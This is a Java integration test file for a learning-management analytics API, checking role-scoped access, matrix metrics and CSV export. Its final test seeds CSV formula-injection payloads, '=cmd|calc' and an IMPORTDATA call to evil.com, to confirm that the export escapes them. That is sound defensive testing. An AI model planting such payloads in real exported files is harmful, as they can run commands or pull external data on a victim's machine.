package com.hcmute.lms.lmsapi.controller;

import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.nullValue;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.hcmute.lms.lmsapi.document.AggregateResult;
import com.hcmute.lms.lmsapi.document.CalculationRun;
import com.hcmute.lms.lmsapi.document.Clo;
import com.hcmute.lms.lmsapi.document.Course;
import com.hcmute.lms.lmsapi.document.CourseSection;
import com.hcmute.lms.lmsapi.document.Plo;
import com.hcmute.lms.lmsapi.document.Program;
import com.hcmute.lms.lmsapi.document.ProgramVersion;
import com.hcmute.lms.lmsapi.document.Term;
import com.hcmute.lms.lmsapi.document.UserScope;
import com.hcmute.lms.lmsapi.enums.CalculationStatus;
import com.hcmute.lms.lmsapi.enums.PloCategory;
import com.hcmute.lms.lmsapi.enums.ProgramVersionStatus;
import com.hcmute.lms.lmsapi.enums.ResultLevel;
import com.hcmute.lms.lmsapi.enums.Role;
import com.hcmute.lms.lmsapi.enums.SectionStatus;
import com.hcmute.lms.lmsapi.testsupport.ApiTestFixtures;
import com.hcmute.lms.lmsapi.testsupport.IntegrationTestBase;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpHeaders;

@DisplayName("AnalyticsController Integration Tests (Milestone 1)")
class AnalyticsControllerIntegrationTest extends IntegrationTestBase {

  private Program program;
  private ProgramVersion programVersion;
  private Course course;
  private Term term;
  private CourseSection section1;
  private CourseSection section2;
  private Clo clo1;
  private CalculationRun calculationRun;

  private String adminToken;
  private String qaToken;
  private String pmToken;
  private String otherPmToken;
  private String lecturerToken;

  private final List<String> createdRunIds = new ArrayList<>();
  private final List<String> createdAggIds = new ArrayList<>();

  @BeforeEach
  void setUpTestData() {
    // 1. Tạo thực thể mẫu dùng ApiTestFixtures
    program = fixtures.program();
    programVersion = fixtures.programVersion(program, ProgramVersionStatus.ACTIVE);
    course = fixtures.course();
    term = fixtures.term();

    // 2. Tạo lớp học phần
    section1 =
        mongo()
            .save(
                CourseSection.builder()
                    .code(fixtures.code("SEC1"))
                    .courseId(course.getId())
                    .termId(term.getId())
                    .enrolledCount(40)
                    .status(SectionStatus.OPEN)
                    .build());

    section2 =
        mongo()
            .save(
                CourseSection.builder()
                    .code(fixtures.code("SEC2"))
                    .courseId(course.getId())
                    .termId(term.getId())
                    .enrolledCount(35)
                    .status(SectionStatus.OPEN)
                    .build());

    // 3. Tạo CLO & PLO
    clo1 =
        mongo()
            .save(
                Clo.builder()
                    .courseId(course.getId())
                    .code("CLO1")
                    .contentOriginal(ApiTestFixtures.LABEL + " Đóng gói và kế thừa")
                    .bloomLevel(2)
                    .build());

    mongo()
        .save(
            Clo.builder()
                .courseId(course.getId())
                .code("CLO2")
                .contentOriginal(ApiTestFixtures.LABEL + " Thiết kế đa hình")
                .bloomLevel(4)
                .build());

    mongo()
        .save(
            Plo.builder()
                .programVersionId(programVersion.getId())
                .code("PLO1")
                .category(PloCategory.GENERAL)
                .displayOrder(1)
                .contentSummary(ApiTestFixtures.LABEL + " Áp dụng kiến thức nền tảng")
                .passThreshold(0.6)
                .build());

    // 4. Tạo CalculationRun có status SUCCESS (Source of Truth)
    calculationRun =
        mongo()
            .save(
                CalculationRun.builder()
                    .programVersionId(programVersion.getId())
                    .status(CalculationStatus.SUCCESS)
                    .official(true)
                    .stale(false)
                    .startedAt(Instant.now().minusSeconds(3600))
                    .finishedAt(Instant.now().minusSeconds(3500))
                    .build());
    createdRunIds.add(calculationRun.getId());

    // 5. Tạo kết quả tổng hợp AggregateResult cho section1 x clo1
    AggregateResult agg1 =
        mongo()
            .save(
                AggregateResult.builder()
                    .runId(calculationRun.getId())
                    .level(ResultLevel.CLO)
                    .subjectId(clo1.getId())
                    .sectionId(section1.getId())
                    .counts(
                        AggregateResult.Counts.builder().enrolled(40).passed(36).failed(4).build())
                    .mean(0.85)
                    .passRate(0.90)
                    .build());
    createdAggIds.add(agg1.getId());

    // 6. Tạo tokens cho 4 vai trò
    adminToken = fixtures.bearerFor(Role.ADMIN, UserScope.builder().build());
    qaToken = fixtures.bearerFor(Role.QA, UserScope.builder().build());

    // PM được phân công programId của program này
    pmToken =
        fixtures.bearerFor(
            Role.PROGRAM_MANAGER,
            UserScope.builder()
                .programIds(List.of(program.getId()))
                .courseIds(List.of(course.getId()))
                .build());

    // PM khác không có quyền trên program này
    Program otherProgram = fixtures.program();
    otherPmToken =
        fixtures.bearerFor(
            Role.PROGRAM_MANAGER,
            UserScope.builder().programIds(List.of(otherProgram.getId())).build());

    // Giảng viên phụ trách section1
    lecturerToken =
        fixtures.bearerFor(
            Role.LECTURER, UserScope.builder().sectionIds(List.of(section1.getId())).build());
  }

  @AfterEach
  void cleanCustomData() {
    for (String aggId : createdAggIds) {
      mongo().remove(mongo().findById(aggId, AggregateResult.class));
    }
    for (String runId : createdRunIds) {
      mongo().remove(mongo().findById(runId, CalculationRun.class));
    }
  }

  // =========================================================================
  // PHÂN QUYỀN VAI TRÒ & SCOPE (R3)
  // =========================================================================

  @Test
  @DisplayName("ADMIN có quyền truy vấn dữ liệu phân tích đa chiều (200 OK)")
  void testAdminCanQueryAnalytics() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_SECTIONS"))
        .andExpect(jsonPath("$.level").value("CLO"))
        .andExpect(jsonPath("$.isOfficial").value(true))
        .andExpect(jsonPath("$.columns").isArray())
        .andExpect(jsonPath("$.rows").isArray())
        .andExpect(jsonPath("$.matrix").isArray());
  }

  @Test
  @DisplayName("QA với Strict Empty Scope có quyền đọc toàn hệ thống (200 OK)")
  void testQaStrictEmptyScopeCanQuery() throws Exception {
    mockMvc
        .perform(
            getAs(
                qaToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_SECTIONS"));
  }

  @Test
  @DisplayName("PROGRAM_MANAGER trong phạm vi phụ trách được phép truy vấn (200 OK)")
  void testProgramManagerWithinScopeAllowed() throws Exception {
    mockMvc
        .perform(
            getAs(
                pmToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}",
                programVersion.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COHORT"));
  }

  @Test
  @DisplayName("PROGRAM_MANAGER ngoài phạm vi phụ trách bị từ chối với 403 Forbidden")
  void testProgramManagerOutOfScopeForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                otherPmToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}",
                programVersion.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER được phép so sánh lớp mình phụ trách (200 OK)")
  void testLecturerWithinScopeAllowed() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={secId}",
                course.getId(),
                section1.getId()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.dimension").value("COURSE_SECTIONS"))
        .andExpect(jsonPath("$.columns", hasSize(1)))
        .andExpect(jsonPath("$.columns[0].id").value(section1.getId()));
  }

  @Test
  @DisplayName("LECTURER truy cập lớp không phụ trách bị từ chối với 403 Forbidden")
  void testLecturerOutOfScopeSectionForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={sec1},{sec2}",
                course.getId(),
                section1.getId(),
                section2.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER truy vấn chiều COHORT (cấp CTĐT) bị từ chối với 403 Forbidden")
  void testLecturerCohortDimensionForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}",
                programVersion.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("PROGRAM_MANAGER truy vấn TIME_TERM không có tham số bị từ chối với 403 Forbidden")
  void testProgramManagerQueryingTimeTermWithoutParametersReturnsForbidden() throws Exception {
    mockMvc
        .perform(getAs(pmToken, "/api/v1/reports/analytics?dimension=TIME_TERM"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "PROGRAM_MANAGER truy vấn runId ngoài phạm vi phụ trách bị từ chối với 403 Forbidden")
  void testProgramManagerQueryingUnauthorizedRunIdReturnsForbidden() throws Exception {
    Program foreignProg = fixtures.program();
    ProgramVersion foreignPv = fixtures.programVersion(foreignProg, ProgramVersionStatus.ACTIVE);
    CalculationRun foreignRun =
        mongo()
            .save(
                CalculationRun.builder()
                    .programVersionId(foreignPv.getId())
                    .status(CalculationStatus.SUCCESS)
                    .official(true)
                    .build());
    createdRunIds.add(foreignRun.getId());

    mockMvc
        .perform(
            getAs(
                pmToken,
                "/api/v1/reports/analytics?dimension=COHORT&programVersionId={pvId}&runId={runId}",
                programVersion.getId(),
                foreignRun.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "LECTURER truy vấn TIME_TERM toàn hệ thống không có lớp/học phần bị từ chối với 403 Forbidden")
  void testLecturerQueryingGlobalTimeTermReturnsForbidden() throws Exception {
    mockMvc
        .perform(getAs(lecturerToken, "/api/v1/reports/analytics?dimension=TIME_TERM"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER truy vấn BLOOM_LEVEL không có học phần bị từ chối với 403 Forbidden")
  void testLecturerQueryingBloomLevelWithoutCourseReturnsForbidden() throws Exception {
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=CURRICULUM_CLASSIFICATION&classificationType=BLOOM_LEVEL"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "LECTURER truy vấn ASSESSMENT_COMPONENT không có học phần bị từ chối với 403 Forbidden")
  void testLecturerQueryingAssessmentComponentWithoutCourseReturnsForbidden() throws Exception {
    mockMvc
        .perform(getAs(lecturerToken, "/api/v1/reports/analytics?dimension=ASSESSMENT_COMPONENT"))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName(
      "LECTURER truy vấn ASSESSMENT_COMPONENT với môn không phụ trách bị từ chối với 403 Forbidden")
  void testLecturerQueryingAssessmentComponentWithUnassignedCourseReturnsForbidden()
      throws Exception {
    Course unassignedCourse = fixtures.course();
    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=ASSESSMENT_COMPONENT&courseId={courseId}",
                unassignedCourse.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("LECTURER truy vấn runId không phụ trách bị từ chối với 403 Forbidden")
  void testLecturerQueryingUnauthorizedRunIdReturnsForbidden() throws Exception {
    Program foreignProg = fixtures.program();
    ProgramVersion foreignPv = fixtures.programVersion(foreignProg, ProgramVersionStatus.ACTIVE);
    CalculationRun foreignRun =
        mongo()
            .save(
                CalculationRun.builder()
                    .programVersionId(foreignPv.getId())
                    .status(CalculationStatus.SUCCESS)
                    .official(true)
                    .build());
    createdRunIds.add(foreignRun.getId());

    mockMvc
        .perform(
            getAs(
                lecturerToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}&sectionIds={secId}&runId={runId}",
                course.getId(),
                section1.getId(),
                foreignRun.getId()))
        .andExpect(status().isForbidden())
        .andExpect(jsonPath("$.status").value(403))
        .andExpect(jsonPath("$.code").value("FORBIDDEN"));
  }

  @Test
  @DisplayName("Yêu cầu chưa xác thực bị từ chối với 401 Unauthorized")
  void testUnauthenticatedAccessRejected() throws Exception {
    mockMvc
        .perform(getAs(null, "/api/v1/reports/analytics?dimension=TIME_TERM"))
        .andExpect(status().isUnauthorized());
  }

  // =========================================================================
  // CẤU TRÚC CHỈ SỐ Ô MA TRẬN & XỬ LÝ MẪU SỐ BẰNG 0 (R2)
  // =========================================================================

  @Test
  @DisplayName("Ô ma trận trả về đủ 10 trường chỉ số và xử lý null an toàn khi chưa có dữ liệu")
  void testCellMetricsPayloadAndZeroDenominatorNullSafety() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        // Ô có dữ liệu: section1 x clo1
        .andExpect(jsonPath("$.matrix[0][0].enrolled").value(40))
        .andExpect(jsonPath("$.matrix[0][0].evaluated").value(40))
        .andExpect(jsonPath("$.matrix[0][0].passed").value(36))
        .andExpect(jsonPath("$.matrix[0][0].failed").value(4))
        .andExpect(jsonPath("$.matrix[0][0].insufficientData").value(0))
        .andExpect(jsonPath("$.matrix[0][0].mean").value(0.85))
        .andExpect(jsonPath("$.matrix[0][0].passRate").value(0.90))
        .andExpect(jsonPath("$.matrix[0][0].passRateOfEnrolled").value(0.90))
        .andExpect(jsonPath("$.matrix[0][0].isOfficial").value(true))
        .andExpect(jsonPath("$.matrix[0][0].isStale").value(false))
        // Ô không có dữ liệu (section2 x clo1): evaluated == 0 -> passRate = null, mean = null
        .andExpect(jsonPath("$.matrix[0][1].enrolled").value(0))
        .andExpect(jsonPath("$.matrix[0][1].evaluated").value(0))
        .andExpect(jsonPath("$.matrix[0][1].passRate").value(nullValue()))
        .andExpect(jsonPath("$.matrix[0][1].mean").value(nullValue()));
  }

  // =========================================================================
  // XUẤT CSV MA TRẬN PHÂN TÍCH (R4)
  // =========================================================================

  @Test
  @DisplayName("Xuất CSV ma trận trả về HTTP 200, Content-Type text/csv, UTF-8 BOM và dữ liệu khớp")
  void testMatrixCsvExportEndpoint() throws Exception {
    mockMvc
        .perform(
            getAs(
                adminToken,
                "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}",
                course.getId()))
        .andExpect(status().isOk())
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("text/csv")))
        .andExpect(header().string(HttpHeaders.CONTENT_TYPE, containsString("charset=UTF-8")))
        .andExpect(
            header()
                .string(
                    HttpHeaders.CONTENT_DISPOSITION,
                    containsString("attachment; filename=\"analytics-matrix-course_sections-")))
        .andExpect(content().string(containsString("BÁO CÁO PHÂN TÍCH ĐA CHIỀU")))
        .andExpect(content().string(containsString("CLO1")))
        .andExpect(content().string(containsString("90.00%")));
  }

  @Test
  @DisplayName("Xuất CSV vô hiệu hóa tấn công chèn công thức CSV (CWE-1236)")
  void testMatrixCsvExportEscapesFormulaCharacters() throws Exception {
    Clo formulaClo =
        mongo()
            .save(
                Clo.builder()
                    .courseId(course.getId())
                    .code("=cmd|calc")
                    .contentOriginal("@IMPORTDATA(http://evil.com)")
                    .bloomLevel(1)
                    .build());

    try {
      mockMvc
          .perform(
              getAs(
                  adminToken,
                  "/api/v1/reports/analytics/export?dimension=COURSE_SECTIONS&courseId={courseId}",
                  course.getId()))
          .andExpect(status().isOk())
          .andExpect(content().string(containsString("'=cmd|calc")))
          .andExpect(content().string(containsString("'@IMPORTDATA")));
    } finally {
      mongo().remove(formulaClo);
    }
  }
}
